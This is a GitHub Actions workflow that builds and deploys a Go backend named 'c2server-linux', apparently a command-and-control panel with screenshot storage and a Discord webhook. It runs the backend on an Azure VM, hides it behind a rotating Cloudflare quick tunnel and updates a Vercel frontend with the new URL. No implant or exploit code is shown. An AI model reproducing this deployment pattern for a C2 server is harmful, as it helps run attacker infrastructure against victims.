name: Deploy Backend to Azure VM

on:
  push:
    branches: [main]
    paths:
      - 'backend/**'
  workflow_dispatch:

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      actions: write

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.23'
          cache-dependency-path: backend/go.sum

      - name: Build Linux binary
        run: |
          cd backend
          GOWORK=off CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o c2server-linux .

      - name: Copy binary to VM
        uses: appleboy/scp-action@v0.1.7
        with:
          host: ${{ secrets.VM_HOST }}
          username: ${{ secrets.VM_USER }}
          key: ${{ secrets.VM_SSH_KEY }}
          source: "backend/c2server-linux"
          target: "/home/${{ secrets.VM_USER }}/FunnyChistosoPanel/backend/"
          strip_components: 1

      - name: Deploy and restart on VM
        uses: appleboy/ssh-action@v1.0.3
        with:
          host: ${{ secrets.VM_HOST }}
          username: ${{ secrets.VM_USER }}
          key: ${{ secrets.VM_SSH_KEY }}
          script: |
            set -e
            cd ~/FunnyChistosoPanel/backend

            echo "Writing .env..."
            cat > .env << EOF
            DB_HOST=${{ secrets.DB_HOST }}
            DB_PORT=5432
            DB_USER=${{ secrets.DB_USER }}
            DB_PASSWORD=${{ secrets.DB_PASSWORD }}
            DB_NAME=${{ secrets.DB_NAME }}
            C2_PORT=:4444
            API_PORT=:8080
            JWT_SECRET=${{ secrets.JWT_SECRET }}
            DISCORD_WEBHOOK_URL=${{ secrets.DISCORD_WEBHOOK_URL }}
            SCREENSHOT_STORAGE_PATH=./screenshots
            SCREENSHOT_BASE_URL=${{ secrets.SCREENSHOT_BASE_URL }}
            EOF
            sed -i 's/^[[:space:]]*//' .env
            echo "[✓] .env written with $(wc -l < .env) lines"
            grep -v -i "password\|secret\|webhook\|token" .env

            echo "Restarting C2 backend..."
            chmod +x c2server-linux
            pkill c2server-linux || true
            sleep 1
            nohup ./c2server-linux > ~/c2server.log 2>&1 &
            sleep 5
            if pgrep c2server-linux > /dev/null; then
              echo "✅ C2 backend is running (PID: $(pgrep c2server-linux))"
            else
              echo "❌ C2 backend failed to start"
              exit 1
            fi
            tail -30 ~/c2server.log

            echo "Starting Cloudflare tunnel..."
            pkill cloudflared || true
            sleep 1
            rm -f ~/cloudflared.log
            nohup cloudflared tunnel --url http://localhost:8080 > ~/cloudflared.log 2>&1 &

            TUNNEL_URL=""
            for i in $(seq 1 30); do
              TUNNEL_URL=$(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' ~/cloudflared.log 2>/dev/null | head -1)
              [ -n "$TUNNEL_URL" ] && break
              sleep 1
            done

            if [ -z "$TUNNEL_URL" ]; then
              echo "❌ Cloudflare tunnel URL not captured"
              cat ~/cloudflared.log
              exit 1
            fi

            echo "✅ Tunnel URL: $TUNNEL_URL"
            echo "$TUNNEL_URL" > ~/tunnel_url.txt

      - name: Fetch tunnel URL from VM
        run: |
          echo "${{ secrets.VM_SSH_KEY }}" > /tmp/vm_key
          chmod 600 /tmp/vm_key
          TUNNEL_URL=$(ssh -i /tmp/vm_key -o StrictHostKeyChecking=no -o BatchMode=yes \
            ${{ secrets.VM_USER }}@${{ secrets.VM_HOST }} "cat ~/tunnel_url.txt")
          WS_URL="${TUNNEL_URL/https:/wss:}/ws"
          echo "TUNNEL_URL=$TUNNEL_URL" >> $GITHUB_ENV
          echo "WS_URL=$WS_URL" >> $GITHUB_ENV
          echo "✅ Got tunnel URL: $TUNNEL_URL"
          rm -f /tmp/vm_key

      - name: Update Vercel environment variables
        run: |
          ENV_LIST=$(curl -sf "https://api.vercel.com/v9/projects/${{ secrets.VERCEL_PROJECT_ID }}/env" \
            -H "Authorization: Bearer ${{ secrets.VERCEL_TOKEN }}")

          API_ENV_ID=$(echo "$ENV_LIST" | python3 -c "
          import sys, json
          for e in json.load(sys.stdin).get('envs', []):
            if e['key'] == 'NEXT_PUBLIC_API_URL' and 'production' in e.get('target', []):
              print(e['id']); break
          ")
          WS_ENV_ID=$(echo "$ENV_LIST" | python3 -c "
          import sys, json
          for e in json.load(sys.stdin).get('envs', []):
            if e['key'] == 'NEXT_PUBLIC_WS_URL' and 'production' in e.get('target', []):
              print(e['id']); break
          ")

          curl -sf -X PATCH "https://api.vercel.com/v9/projects/${{ secrets.VERCEL_PROJECT_ID }}/env/$API_ENV_ID" \
            -H "Authorization: Bearer ${{ secrets.VERCEL_TOKEN }}" \
            -H "Content-Type: application/json" \
            -d "{\"value\": \"$TUNNEL_URL\"}" > /dev/null

          curl -sf -X PATCH "https://api.vercel.com/v9/projects/${{ secrets.VERCEL_PROJECT_ID }}/env/$WS_ENV_ID" \
            -H "Authorization: Bearer ${{ secrets.VERCEL_TOKEN }}" \
            -H "Content-Type: application/json" \
            -d "{\"value\": \"$WS_URL\"}" > /dev/null

          echo "✅ Vercel env vars updated to $TUNNEL_URL"

      - name: Trigger frontend redeploy
        run: |
          curl -s -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${{ github.repository }}/actions/workflows/deploy.yml/dispatches" \
            -d "{\"ref\":\"main\",\"inputs\":{\"api_url\":\"$TUNNEL_URL\",\"ws_url\":\"$WS_URL\"}}"
          echo "✅ Frontend redeploy triggered with URL: $TUNNEL_URL"
